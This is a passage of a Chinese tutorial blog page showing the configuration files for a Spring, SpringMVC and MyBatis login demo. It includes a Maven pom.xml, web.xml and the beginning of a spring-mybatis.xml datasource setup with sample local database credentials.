class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>LoginDemo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.cyan<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>ssm<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>war<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://maven.apache.org<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">build</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">finalName</span>&gt;</span>ssm<span class="tag">&lt;/<span class="name">finalName</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">plugins</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--mybatis 逆向工程插件--&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis.generator<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-generator-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.3.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">verbose</span>&gt;</span>true<span class="tag">&lt;/<span class="name">verbose</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">overwrite</span>&gt;</span>true<span class="tag">&lt;/<span class="name">overwrite</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">source</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">source</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">target</span>&gt;</span>1.6<span class="tag">&lt;/<span class="name">target</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">plugins</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">build</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">spring.version</span>&gt;</span>4.1.1.RELEASE<span class="tag">&lt;/<span class="name">spring.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- springframe start --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-web<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-oxm<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-tx<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-jdbc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-webmvc<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-aop<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-context-support<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.springframework<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>spring-test<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>$&#123;spring.version&#125;<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- springframe end --&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--aspectj start--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjweaver<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjrt<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.8.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--aspectj end--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--c3p0--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.mchange<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>c3p0<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>0.9.5.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--servlet/jsp api start--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet.jsp<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jsp-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--servlet/jsp api end--&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--junit4--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.11<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--mybatis--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.3.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--mybatis spring整合--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mybatis<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mybatis-spring<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--mysql driver--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>mysql<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>mysql-connector-java<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>5.1.6<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!--jstl--&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jstl<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.2<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">project</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="三-、配置文件"><a href="#三-、配置文件" class="headerlink" title="(三)、配置文件"></a>(三)、配置文件</h3><ol><li>web.xml</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">web-app</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_3_1.xsd&quot;</span></span></span><br><span class="line"><span class="tag">         <span class="attr">version</span>=<span class="string">&quot;3.1&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- Spring ApplicationContext 载入 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>org.springframework.web.context.ContextLoaderListener<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- SpringMVC核心Servlet --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC-config<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-class</span>&gt;</span>org.springframework.web.servlet.DispatcherServlet<span class="tag">&lt;/<span class="name">servlet-class</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">init-param</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:/WEB-INF/springMVC-config.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">init-param</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 拦截所有请求 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>springMVC-config<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">servlet-mapping</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- spring配置文件加载 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context-param</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-name</span>&gt;</span>contextConfigLocation<span class="tag">&lt;/<span class="name">param-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">param-value</span>&gt;</span>classpath:WEB-INF/spring-mybatis.xml<span class="tag">&lt;/<span class="name">param-value</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">context-param</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">web-app</span>&gt;</span></span><br></pre></td></tr></table></figure><ol start="2"><li>spring-mybatis.xml</li></ol><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:p</span>=<span class="string">&quot;http://www.springframework.org/schema/p&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:context</span>=<span class="string">&quot;http://www.springframework.org/schema/context&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:tx</span>=<span class="string">&quot;http://www.springframework.org/schema/tx&quot;</span> <span class="attr">xmlns:aop</span>=<span class="string">&quot;http://www.springframework.org/schema/aop&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://www.springframework.org/schema/beans</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/beans/spring-beans-3.2.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/context/spring-context-3.2.xsd</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/tx</span></span></span><br><span class="line"><span class="string"><span class="tag">        http://www.springframework.org/schema/tx/spring-tx-3.2.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop.xsd&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 自动搜索bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:annotation-config</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">context:component-scan</span> <span class="attr">base-package</span>=<span class="string">&quot;com.cyan&quot;</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;datasource&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.springframework.jdbc.datasource.DriverManagerDataSource&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;driverClassName&quot;</span> <span class="attr">value</span>=<span class="string">&quot;com.mysql.jdbc.Driver&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;url&quot;</span> <span class="attr">value</span>=<span class="string">&quot;jdbc:mysql://localhost:3306/Demo&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;username&quot;</span> <span class="attr">value</span>=<span class="string">&quot;root&quot;</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;password&quot;</span> <span class="attr">value</span>=<span class="string">&quot;2233&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- mybatis核心bean --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;sqlSessionFactory&quot;</span> <span class="attr">class</span>=<span class="string">&quot;org.mybatis.spring.SqlSessionFactoryBean&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;dataSource&quot;</span> <span class="attr">ref</span>=<span class="string">&quot;datasource&quot;</span>/&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 这句配置mapper配置文件的位置 如果采用注解的方式这句可以省去 --&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--&lt;property name=&quot;mapperLocations&quot; value=&quot;classpath:/WEB-INF/Mappers/*.xml&quot; /&gt;--&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span 